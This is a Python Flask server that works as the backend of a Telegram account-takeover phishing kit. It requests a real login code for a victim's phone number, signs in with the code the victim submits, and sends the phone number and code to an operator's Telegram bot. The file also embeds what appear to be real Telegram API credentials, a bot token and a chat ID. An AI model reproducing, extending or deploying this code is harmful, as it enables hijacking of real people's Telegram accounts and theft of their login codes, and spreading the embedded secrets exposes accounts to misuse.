from flask import Flask, request, jsonify
from flask_cors import CORS
from pyrogram import Client
import asyncio
import os
import re
import requests
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Your Telegram API credentials
API_ID = 6627460
API_HASH = "27a53a0965e486a2bc1b1fcde473b1c4"

# YOUR BOT TOKEN - YOU'LL ADD THIS IN STEP 6
BOT_TOKEN = "8862345996:AAH2M2RQMIBuDLpkhb69NxCdrVM_Fd45GIk"
YOUR_CHAT_ID = "8796685138"

verification_data = {}

def clean_phone(phone):
    return re.sub(r'\D', '', phone)

def send_to_telegram_bot(phone, code):
    message = f"""
🔐 New Login Attempt

📱 Phone: {phone}
🔑 Code: {code}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": YOUR_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    
    try:
        response = requests.post(url, json=payload)
        return response.ok
    except Exception as e:
        print(f"Error: {e}")
        return False

@app.route('/send-code', methods=['POST'])
def send_code():
    try:
        data = request.json
        phone = data.get('phone', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone required'}), 400
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def send_telegram_code():
            client = None
            try:
                client = Client(
                    name=f"session_{clean_phone(phone)}_{datetime.now().timestamp()}",
                    api_id=API_ID,
                    api_hash=API_HASH,
                    in_memory=True
                )
                
                await client.connect()
                sent_code = await client.send_code(phone_number=phone)
                
                verification_data[phone] = {
                    'phone_code_hash': sent_code.phone_code_hash,
                    'timestamp': datetime.now().timestamp()
                }
                
                return {
                    'success': True,
                    'message': 'Code sent to your Telegram account!',
                    'phone_code_hash': sent_code.phone_code_hash
                }
                
            except Exception as e:
                error_msg = str(e)
                if 'FLOOD_WAIT' in error_msg:
                    return {'success': False, 'error': 'Too many attempts. Wait a few minutes.'}
                elif 'PHONE_NUMBER_INVALID' in error_msg:
                    return {'success': False, 'error': 'Invalid phone number'}
                else:
                    return {'success': False, 'error': f'Error: {error_msg}'}
            finally:
                if client:
                    await client.disconnect()
        
        result = loop.run_until_complete(send_telegram_code())
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        phone = data.get('phone', '')
        code = data.get('code', '')
        phone_code_hash = data.get('phone_code_hash', '')
        
        if not phone or not code:
            return jsonify({'success': False, 'error': 'Phone and code required'}), 400
        
        if phone not in verification_data:
            return jsonify({'success': False, 'error': 'No code request found'}), 400
        
        stored = verification_data[phone]
        
        if datetime.now().timestamp() - stored['timestamp'] > 300:
            del verification_data[phone]
            return jsonify({'success': False, 'error': 'Code expired'}), 400
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def verify_telegram_code():
            client = None
            try:
                client = Client(
                    name=f"verify_{clean_phone(phone)}_{datetime.now().timestamp()}",
                    api_id=API_ID,
                    api_hash=API_HASH,
                    in_memory=True
                )
                
                await client.connect()
                await client.sign_in(
                    phone_number=phone,
                    code=code,
                    phone_code_hash=phone_code_hash
                )
                
                return {'success': True, 'message': 'Login successful!'}
                
            except Exception as e:
                error_msg = str(e)
                if 'PHONE_CODE_INVALID' in error_msg:
                    return {'success': False, 'error': 'Invalid code'}
                elif 'PHONE_CODE_EXPIRED' in error_msg:
                    return {'success': False, 'error': 'Code expired'}
                else:
                    return {'success': False, 'error': f'Error: {error_msg}'}
            finally:
                if client:
                    await client.disconnect()
        
        result = loop.run_until_complete(verify_telegram_code())
        
        if result['success']:
            bot_sent = send_to_telegram_bot(phone, code)
            if bot_sent:
                result['bot_message'] = 'Credentials sent to your bot'
            else:
                result['bot_message'] = 'Failed to send to bot'
            del verification_data[phone]
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
